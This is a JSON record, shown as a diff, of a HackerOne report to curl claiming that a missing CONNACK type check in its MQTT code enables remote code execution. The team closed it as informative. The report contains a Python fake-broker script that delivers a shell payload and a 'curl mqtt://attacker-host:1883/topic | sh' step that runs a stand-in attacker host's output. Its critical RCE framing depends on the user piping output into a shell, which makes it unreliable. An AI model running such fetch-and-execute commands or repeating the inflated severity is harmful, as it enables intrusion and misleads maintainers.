@@ -1,0 +1,123 @@
+{
+  "id": 3712343,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzEyMzQz",
+  "url": "https://hackerone.com/reports/3712343",
+  "title": "MQTT CONNACK Packet Type Bypass leads to RCE via Malicious Broker",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "critical",
+  "readable_substate": "Informative",
+  "created_at": "2026-05-04T13:51:26.955Z",
+  "submitted_at": "2026-05-04T13:51:28.187Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "orelbn7",
+    "url": "/orelbn7",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-05-05T08:23:07.675Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-05-04T17:58:15.393Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\n`mqtt_verify_connack()` in `lib/mqtt.c` never checks that the received packet type is actually a CONNACK (`0x20`). The constant `MQTT_MSG_CONNACK` is commented out at line 45, making the check impossible to write. A malicious broker can send any packet — e.g. PUBACK (`0x40`) — with `remaining_length=2` and payload `0x00 0x00`, and curl will accept it as a valid handshake, subscribe to the topic, and begin receiving PUBLISH data. Since the broker now fully controls what bytes curl writes to the application's output, any caller that pipes or executes curl's output (OTA updaters, script runners, config loaders) is exposed to remote code execution. The existing 8.20.1 guard at lines 895–912 only covers PINGRESP and DISCONNECT — the CONNACK path is left completely unguarded.\n\n```python\nimport socket, struct\n\ndef fake_connack():\n    return bytes([0x40, 0x02, 0x00, 0x00])  # PUBACK, not CONNACK\n\ndef malicious_publish(payload):\n    topic = b\"x\"\n    body = struct.pack(\">H\", len(topic)) + topic + payload\n    return bytes([0x30, len(body)]) + body\n\nsrv = socket.socket()\nsrv.bind((\"0.0.0.0\", 1883))\nsrv.listen(1)\nconn, _ = srv.accept()\nconn.recv(1024)                                         # discard CONNECT\nconn.sendall(fake_connack())\nconn.recv(1024)                                         # discard SUBSCRIBE\nconn.sendall(malicious_publish(b\"#!/bin/sh\\nid\\n\"))\nconn.close()\n```\n\n## Affected version\n\nConfirmed on curl 8.20.1. The bug is present in `lib/mqtt.c` and is reproducible on any platform where MQTT support is compiled in (`--with-mqtt`). The `MQTT_MSG_CONNACK` define was commented out before this version; the 8.20.1 MQTT patch (HackerOne #3702718) did not restore it.\n\n```\ncurl 8.20.1 (x86_64-pc-linux-gnu) libcurl/8.20.1 OpenSSL/3.x\nRelease-Date: 2025-04-16\nProtocols: mqtt ...\n```\n\n## Steps To Reproduce:\n\n1. Run the Python script above on a machine the curl client can reach (e.g. `python3 broker.py`).\n2. In a second terminal, run:\n   ```sh\n   curl mqtt://attacker-host:1883/topic | sh\n   ```\n3. Observe that curl accepts the fake CONNACK (PUBACK `0x40`) without error, sends a SUBSCRIBE, and then receives the PUBLISH payload.\n4. The shell executes the payload delivered by the broker — in the example above, `id` runs and prints the current user. Replace with any command to confirm arbitrary execution.\n\nThe root cause is in `mqtt_verify_connack()` (lib/mqtt.c:404–436): the function checks `remaining_length == 2` and `ptr[0] == 0x00 && ptr[1] == 0x00` but never checks `mq->firstbyte == 0x20`. The constant needed for that check (`MQTT_MSG_CONNACK`) is commented out at line 45. Restoring the define and adding `if(mq->firstbyte != MQTT_MSG_CONNACK) return CURLE_WEIRD_SERVER_REPLY;` as the first check in that function fully resolves the issue.\n\n## Impact\n\n## Summary:\nDirect RCE — Any application that pipes curl's MQTT output to a shell, interpreter, or executor runs attacker code. This is common in IoT deployments, CI/CD pipelines, and OTA update systems. The attacker doesn't need a memory corruption exploit — they just deliver the payload and the application runs it.\n\nFirmware takeover — Embedded devices that use curl to pull firmware over MQTT and then flash it will boot whatever the attacker delivers. No memory corruption needed. Persistent, survives reboots.\n\nConfig poisoning — If curl writes MQTT data to a config file that another process reads (cron, sudoers, nginx config, etc.), the attacker controls that config. Privilege escalation or persistence follow.\n\nData integrity — Even if the application doesn't execute the data, it processes it as trusted. Sensor readings, telemetry, command payloads — all can be spoofed. In industrial/SCADA contexts that alone is critical.\n\nWho is at risk: Any curl user using mqtt:// URLs against a broker the attacker can reach or impersonate. The attacker doesn't need to be on the local network if TLS is not enforced (and most MQTT deployments don't enforce it).\n\nWhat makes it worse: MQTT is almost exclusively used in automated, unattended contexts — IoT devices, background services, daemons. There's no human in the loop to notice something is wrong. The device just executes whatever arrives.\n\nThe CONNACK bypass is the entry point. RCE is the consequence. The severity scales with what the application does next.",
+  "weakness": {
+    "id": 1633,
+    "name": "ASI05: Unexpected Code Execution (RCE)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 17,
+  "voters": [
+    "2026",
+    "ballistic62",
+    "dru5ud0",
+    "anon133_t",
+    "shaunhacker",
+    "mentoo",
+    "1973_66",
+    "arkad17",
+    "blackhelmet",
+    "hazzeytonah",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
